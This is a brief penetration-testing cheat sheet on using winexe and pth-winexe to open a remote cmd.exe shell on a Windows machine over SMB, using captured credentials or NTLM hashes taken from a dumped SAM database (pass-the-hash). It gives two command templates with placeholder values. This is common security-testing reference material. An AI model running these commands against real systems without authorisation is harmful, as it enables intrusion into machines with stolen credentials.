Remote Shells w/ winexe & pth-winexe on Windows
If youâ€™re able to come across credentials or NTLM hashes for a Windows box that has SMB enabled, you may be able to leverage the tool called winexe to gain a shell. If you have captured a NTLM hash, say from dumping a SAM database, you may be able to pass-the-hash.

Basic syntax w/ credentials:
winexe -U <domain/username>%<password> //<targetIP> cmd.exe

Basic syntax w/ NTLM hash (pass the hash technique):
pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
